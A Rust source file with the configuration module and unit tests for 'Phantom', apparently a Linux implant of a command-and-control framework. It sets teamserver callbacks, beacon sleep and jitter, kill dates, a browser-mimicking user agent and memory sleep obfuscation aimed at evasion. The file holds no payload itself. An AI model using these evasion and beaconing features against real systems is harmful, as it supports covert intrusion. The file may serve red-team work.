//! Runtime configuration for the Phantom Linux agent.

use std::ffi::{OsStr, OsString};

use crate::error::PhantomError;
use crate::sleep_obfuscate::SleepMode;

/// Configuration inputs that control Phantom's callback transport and timing.
#[derive(Debug, Clone)]
pub struct PhantomConfig {
    /// Teamserver HTTP(S) callback endpoint.
    pub callback_url: String,
    /// Optional listener init secret used for HKDF session key derivation.
    pub init_secret: Option<String>,
    /// PEM-encoded certificate to pin for TLS connections to the teamserver.
    ///
    /// When set, only the teamserver presenting this certificate (or one signed by it) is
    /// trusted. When `None`, the system CA store is used instead.  Configured at runtime via
    /// the `PHANTOM_PINNED_CERT_PEM` environment variable.
    pub pinned_cert_pem: Option<String>,
    /// HTTP user agent sent with callbacks.
    pub user_agent: String,
    /// Base sleep interval in milliseconds.
    pub sleep_delay_ms: u32,
    /// Jitter percentage applied to the sleep interval.
    pub sleep_jitter: u32,
    /// Optional Unix timestamp after which the agent exits.
    pub kill_date: Option<i64>,
    /// Optional working-hours bitmask carried in init metadata.
    pub working_hours: Option<i32>,
    /// Sleep obfuscation technique applied between check-ins.
    ///
    /// Defaults to [`SleepMode::Mprotect`] which marks anonymous heap pages
    /// `PROT_NONE` during the sleep window.  Use `plain` when running under a
    /// `seccomp` policy that denies `mprotect` or for debugging.
    pub sleep_mode: SleepMode,
}

impl PhantomConfig {
    /// Build a configuration from command-line arguments and environment variables.
    ///
    /// Environment variables are applied first and may be overridden by flags:
    /// `PHANTOM_CALLBACK_URL`, `PHANTOM_INIT_SECRET`, `PHANTOM_USER_AGENT`,
    /// `PHANTOM_SLEEP_DELAY_MS`, `PHANTOM_SLEEP_JITTER`, `PHANTOM_KILL_DATE`,
    /// and `PHANTOM_WORKING_HOURS`.
    pub fn from_sources<I, S, J, K, V>(args: I, env: J) -> Result<Self, PhantomError>
    where
        I: IntoIterator<Item = S>,
        S: Into<OsString>,
        J: IntoIterator<Item = (K, V)>,
        K: Into<OsString>,
        V: Into<OsString>,
    {
        let mut config = Self::default();
        config.apply_env(env)?;
        config.apply_args(args)?;
        config.validate()?;
        Ok(config)
    }

    /// Validate the configuration before the agent starts.
    pub fn validate(&self) -> Result<(), PhantomError> {
        if self.callback_url.trim().is_empty() {
            return Err(PhantomError::InvalidConfig("callback_url must not be empty"));
        }
        if matches!(self.init_secret.as_deref(), Some("")) {
            return Err(PhantomError::InvalidConfig("init_secret must not be empty"));
        }
        if self.sleep_jitter > 100 {
            return Err(PhantomError::InvalidConfig("sleep_jitter must be between 0 and 100"));
        }
        Ok(())
    }

    /// Return CLI help text for the Phantom binary.
    pub fn usage() -> &'static str {
        concat!(
            "Usage: phantom [options]\n\n",
            "Options:\n",
            "  --callback-url URL       Teamserver callback endpoint\n",
            "  --init-secret SECRET     HKDF listener init secret\n",
            "  --user-agent VALUE       HTTP User-Agent header\n",
            "  --sleep-delay-ms N       Base sleep interval in milliseconds\n",
            "  --sleep-jitter N         Sleep jitter percentage (0-100)\n",
            "  --kill-date UNIX_TS      Exit after this Unix timestamp\n",
            "  --working-hours MASK     Working-hours bitmask advertised in init\n",
            "  --sleep-mode MODE        Sleep obfuscation: plain or mprotect (default: mprotect)\n",
            "  -h, --help               Show this help text\n\n",
            "Environment:\n",
            "  PHANTOM_CALLBACK_URL, PHANTOM_INIT_SECRET, PHANTOM_USER_AGENT,\n",
            "  PHANTOM_SLEEP_DELAY_MS, PHANTOM_SLEEP_JITTER, PHANTOM_KILL_DATE,\n",
            "  PHANTOM_WORKING_HOURS, PHANTOM_PINNED_CERT_PEM, PHANTOM_SLEEP_MODE\n",
        )
    }

    fn apply_env<J, K, V>(&mut self, env: J) -> Result<(), PhantomError>
    where
        J: IntoIterator<Item = (K, V)>,
        K: Into<OsString>,
        V: Into<OsString>,
    {
        for (key, value) in env {
            let key = key.into();
            let value = value.into();
            match key.to_str() {
                Some("PHANTOM_CALLBACK_URL") => {
                    self.callback_url = parse_os_string(value, "PHANTOM_CALLBACK_URL")?;
                }
                Some("PHANTOM_INIT_SECRET") => {
                    self.init_secret = Some(parse_os_string(value, "PHANTOM_INIT_SECRET")?);
                }
                Some("PHANTOM_USER_AGENT") => {
                    self.user_agent = parse_os_string(value, "PHANTOM_USER_AGENT")?;
                }
                Some("PHANTOM_SLEEP_DELAY_MS") => {
                    self.sleep_delay_ms = parse_os_value(&value, "PHANTOM_SLEEP_DELAY_MS")?;
                }
                Some("PHANTOM_SLEEP_JITTER") => {
                    self.sleep_jitter = parse_os_value(&value, "PHANTOM_SLEEP_JITTER")?;
                }
                Some("PHANTOM_KILL_DATE") => {
                    self.kill_date = Some(parse_os_value(&value, "PHANTOM_KILL_DATE")?);
                }
                Some("PHANTOM_WORKING_HOURS") => {
                    self.working_hours = Some(parse_os_value(&value, "PHANTOM_WORKING_HOURS")?);
                }
                Some("PHANTOM_PINNED_CERT_PEM") => {
                    self.pinned_cert_pem = Some(parse_os_string(value, "PHANTOM_PINNED_CERT_PEM")?);
                }
                Some("PHANTOM_SLEEP_MODE") => {
                    let s = parse_os_string(value, "PHANTOM_SLEEP_MODE")?;
                    self.sleep_mode = SleepMode::parse(&s).ok_or_else(|| {
                        PhantomError::Argument(format!(
                            "unknown sleep mode {s:?}; expected plain or mprotect"
                        ))
                    })?;
                }
                _ => {}
            }
        }

        Ok(())
    }

    fn apply_args<I, S>(&mut self, args: I) -> Result<(), PhantomError>
    where
        I: IntoIterator<Item = S>,
        S: Into<OsString>,
    {
        let mut args = args.into_iter().map(Into::into);
        let _program_name = args.next();

        while let Some(argument) = args.next() {
            let argument_string = parse_os_string(argument, "argument")?;
            if matches!(argument_string.as_str(), "-h" | "--help") {
                continue;
            }

            let (flag, inline_value) = match argument_string.split_once('=') {
                Some((flag, value)) => (flag, Some(value.to_string())),
                None => (argument_string.as_str(), None),
            };

            let value = match inline_value {
                Some(value) => value,
                None => {
                    let next = args.next().ok_or_else(|| {
                        PhantomError::Argument(format!("missing value for {flag}"))
                    })?;
                    parse_os_string(next, flag)?
                }
            };

            match flag {
                "--callback-url" => self.callback_url = value,
                "--init-secret" => self.init_secret = Some(value),
                "--user-agent" => self.user_agent = value,
                "--sleep-delay-ms" => {
                    self.sleep_delay_ms = parse_string_value(&value, flag)?;
                }
                "--sleep-jitter" => {
                    self.sleep_jitter = parse_string_value(&value, flag)?;
                }
                "--kill-date" => {
                    self.kill_date = Some(parse_string_value(&value, flag)?);
                }
                "--working-hours" => {
                    self.working_hours = Some(parse_string_value(&value, flag)?);
                }
                "--sleep-mode" => {
                    self.sleep_mode = SleepMode::parse(&value).ok_or_else(|| {
                        PhantomError::Argument(format!(
                            "unknown sleep mode {value:?}; expected plain or mprotect"
                        ))
                    })?;
                }
                _ => return Err(PhantomError::Argument(format!("unknown argument {flag}"))),
            }
        }

        Ok(())
    }
}

impl Default for PhantomConfig {
    fn default() -> Self {
        Self {
            callback_url: String::from("https://127.0.0.1:40056/"),
            init_secret: None,
            pinned_cert_pem: None,
            user_agent: String::from(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            ),
            sleep_delay_ms: 5_000,
            sleep_jitter: 0,
            kill_date: None,
            working_hours: None,
            sleep_mode: SleepMode::default(),
        }
    }
}

fn parse_os_string(value: OsString, key: &str) -> Result<String, PhantomError> {
    value.into_string().map_err(|_| PhantomError::Argument(format!("{key} must be valid UTF-8")))
}

fn parse_os_value<T>(value: &OsStr, key: &str) -> Result<T, PhantomError>
where
    T: std::str::FromStr,
{
    let value = value
        .to_str()
        .ok_or_else(|| PhantomError::Argument(format!("{key} must be valid UTF-8")))?;
    parse_string_value(value, key)
}

fn parse_string_value<T>(value: &str, key: &str) -> Result<T, PhantomError>
where
    T: std::str::FromStr,
{
    value
        .parse::<T>()
        .map_err(|_| PhantomError::Argument(format!("invalid value for {key}: {value}")))
}

#[cfg(test)]
mod tests {
    use super::PhantomConfig;

    #[test]
    fn default_config_is_valid() {
        let config = PhantomConfig::default();
        assert!(config.validate().is_ok());
    }

    #[test]
    fn empty_callback_url_is_rejected() {
        let config = PhantomConfig { callback_url: String::new(), ..Default::default() };
        assert!(config.validate().is_err());
    }

    #[test]
    fn jitter_over_100_is_rejected() {
        let config = PhantomConfig { sleep_jitter: 101, ..Default::default() };
        assert!(config.validate().is_err());
    }

    #[test]
    fn empty_init_secret_is_rejected() {
        let config = PhantomConfig { init_secret: Some(String::new()), ..Default::default() };
        assert!(config.validate().is_err());
    }

    #[test]
    fn from_sources_applies_environment_values() {
        let config = PhantomConfig::from_sources(
            ["phantom"],
            [
                ("PHANTOM_CALLBACK_URL", "https://teamserver.local/"),
                ("PHANTOM_USER_AGENT", "phantom-test"),
                ("PHANTOM_SLEEP_DELAY_MS", "1500"),
                ("PHANTOM_SLEEP_JITTER", "15"),
                ("PHANTOM_KILL_DATE", "1700000000"),
                ("PHANTOM_WORKING_HOURS", "255"),
                ("PHANTOM_INIT_SECRET", "sekrit"),
            ],
        )
        .expect("config");

        assert_eq!(config.callback_url, "https://teamserver.local/");
        assert_eq!(config.user_agent, "phantom-test");
        assert_eq!(config.sleep_delay_ms, 1500);
        assert_eq!(config.sleep_jitter, 15);
        assert_eq!(config.kill_date, Some(1_700_000_000));
        assert_eq!(config.working_hours, Some(255));
        assert_eq!(config.init_secret.as_deref(), Some("sekrit"));
        assert!(config.pinned_cert_pem.is_none());
    }

    #[test]
    fn from_sources_applies_pinned_cert_pem_from_env() {
        let config = PhantomConfig::from_sources(
            ["phantom"],
            [
                ("PHANTOM_CALLBACK_URL", "https://teamserver.local/"),
                (
                    "PHANTOM_PINNED_CERT_PEM",
                    "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n",
                ),
            ],
        )
        .expect("config");

        assert_eq!(
            config.pinned_cert_pem.as_deref(),
            Some("-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n")
        );
    }

    #[test]
    fn from_sources_prefers_cli_over_environment() {
        let config = PhantomConfig::from_sources(
            [
                "phantom",
                "--callback-url",
                "https://override.local/",
                "--sleep-delay-ms=2500",
                "--sleep-jitter",
                "5",
            ],
            [("PHANTOM_CALLBACK_URL", "https://env.local/"), ("PHANTOM_SLEEP_DELAY_MS", "1000")],
        )
        .expect("config");

        assert_eq!(config.callback_url, "https://override.local/");
        assert_eq!(config.sleep_delay_ms, 2500);
        assert_eq!(config.sleep_jitter, 5);
    }

    #[test]
    fn from_sources_rejects_unknown_arguments() {
        let error = PhantomConfig::from_sources(
            ["phantom", "--bogus", "value"],
            std::iter::empty::<(&str, &str)>(),
        )
        .expect_err("unknown flag should fail");
        assert!(matches!(
            error,
            crate::error::PhantomError::Argument(message) if message.contains("--bogus")
        ));
    }

    #[test]
    fn from_sources_rejects_invalid_numeric_values() {
        let error = PhantomConfig::from_sources(
            ["phantom", "--sleep-jitter", "oops"],
            std::iter::empty::<(&str, &str)>(),
        )
        .expect_err("invalid number should fail");
        assert!(matches!(
            error,
            crate::error::PhantomError::Argument(message) if message.contains("--sleep-jitter")
        ));
    }

    #[test]
    fn usage_mentions_supported_inputs() {
        let usage = PhantomConfig::usage();
        assert!(usage.contains("--callback-url"));
        assert!(usage.contains("PHANTOM_CALLBACK_URL"));
        assert!(usage.contains("--sleep-mode"));
        assert!(usage.contains("PHANTOM_SLEEP_MODE"));
    }

    #[test]
    fn sleep_mode_env_plain() {
        let config = PhantomConfig::from_sources(
            ["phantom"],
            [("PHANTOM_CALLBACK_URL", "https://ts.local/"), ("PHANTOM_SLEEP_MODE", "plain")],
        )
        .expect("config");
        assert_eq!(config.sleep_mode, crate::sleep_obfuscate::SleepMode::Plain);
    }

    #[test]
    fn sleep_mode_cli_overrides_env() {
        let config = PhantomConfig::from_sources(
            ["phantom", "--sleep-mode", "plain"],
            [("PHANTOM_CALLBACK_URL", "https://ts.local/"), ("PHANTOM_SLEEP_MODE", "mprotect")],
        )
        .expect("config");
        assert_eq!(config.sleep_mode, crate::sleep_obfuscate::SleepMode::Plain);
    }

    #[test]
    fn sleep_mode_rejects_unknown_value() {
        let err = PhantomConfig::from_sources(
            ["phantom", "--sleep-mode", "turbo"],
            std::iter::empty::<(&str, &str)>(),
        )
        .expect_err("unknown mode should fail");
        assert!(matches!(
            err,
            crate::error::PhantomError::Argument(msg) if msg.contains("turbo")
        ));
    }

    #[test]
    fn default_sleep_mode_is_mprotect() {
        let config = PhantomConfig::default();
        assert_eq!(config.sleep_mode, crate::sleep_obfuscate::SleepMode::Mprotect);
    }
}
